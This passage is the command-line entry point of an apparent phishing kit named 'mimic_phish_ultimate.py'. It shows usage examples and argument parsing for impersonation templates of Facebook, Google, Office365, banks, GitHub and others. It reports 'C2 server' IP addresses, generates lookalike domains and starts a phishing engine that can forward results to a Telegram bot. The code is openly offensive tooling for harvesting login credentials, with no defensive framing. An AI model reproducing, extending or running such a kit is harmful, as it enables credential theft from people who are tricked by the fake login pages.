  sudo python3 mimic_phish_ultimate.py --template facebook --port 80
  sudo python3 mimic_phish_ultimate.py --template google --ssl --telegram-token TOKEN --telegram-chat CHAT_ID
        """
    )
    
    parser.add_argument("--template", help="Template name (facebook, google, office365, bank, cloudflare, instagram, twitter, linkedin, github)")
    parser.add_argument("--port", type=int, default=80, help="Port to listen on")
    parser.add_argument("--ssl", action="store_true", help="Enable SSL")
    parser.add_argument("--domain", help="Custom domain")
    parser.add_argument("--telegram-token", help="Telegram bot token")
    parser.add_argument("--telegram-chat", help="Telegram chat ID")
    
    args = parser.parse_args()
    
    print_banner()
    
    if os.geteuid() != 0 and args.port < 1024:
        cprint("[!] Root privileges required for ports below 1024", Colors.RED)
        sys.exit(1)
    
    if args.template:
        # Show C2 info
        ips = C2IPDetector.get_all_ips()
        cprint("\n[+] C2 Server Information:", Colors.CYAN)
        cprint(f"[+] Public IP: {ips.get('public', 'Unknown')}", Colors.GREEN)
        cprint(f"[+] Local IP: {ips.get('local', 'Unknown')}", Colors.GREEN)
        
        # Generate domain
        domain = args.domain or DomainGenerator.generate_domain(args.template)
        cprint(f"[+] Domain: {domain}", Colors.GOLD)
        cprint(f"[+] Link: https://{domain}", Colors.GOLD)
        
        engine = PhishingEngine(args.port, args.ssl, domain, args.telegram_token, args.telegram_chat)
        engine.start(args.template)
    else:
        mimic = MimicPhishUltimate()
        mimic.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Operation interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[ERROR] {e}", Colors.RED)
        sys.exit(1)
